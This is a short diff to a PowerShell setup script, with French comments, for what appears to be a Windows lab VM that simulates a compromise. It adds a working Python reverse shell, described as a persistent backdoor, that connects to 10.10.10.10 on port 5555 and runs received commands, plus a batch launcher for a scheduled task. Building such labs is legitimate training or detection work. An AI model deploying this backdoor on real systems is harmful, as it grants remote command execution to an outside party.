@@ -29,6 +29,25 @@ while True:
 "@
 [System.IO.File]::WriteAllText("C:\Users\vagrant\lab\reverse.py", $reverseShell)
 
+# Backdoor pérenne — même logique, port différent (5555) pour simuler un second accès
+$svcShell = @"
+import socket, subprocess
+
+s = socket.socket()
+s.connect(('10.10.10.10', 5555))
+while True:
+    cmd = s.recv(1024).decode().strip()
+    if not cmd:
+        break
+    output = subprocess.run(cmd, shell=True, capture_output=True)
+    s.send(output.stdout + output.stderr)
+"@
+[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\svc.py", $svcShell)
+
+# Lanceur batch — utilisé par la tâche planifiée (évite les guillemets imbriqués dans schtasks)
+[System.IO.File]::WriteAllText("C:\Users\vagrant\lab\launch.bat",
+    "C:\Users\vagrant\lab\pyembed\python.exe C:\Users\vagrant\lab\svc.py`r`n")
+
 # Python embarqué (pas d'installation système requise)
 (New-Object Net.WebClient).DownloadFile(
     "https://www.python.org/ftp/python/3.12.7/python-3.12.7-embed-amd64.zip",
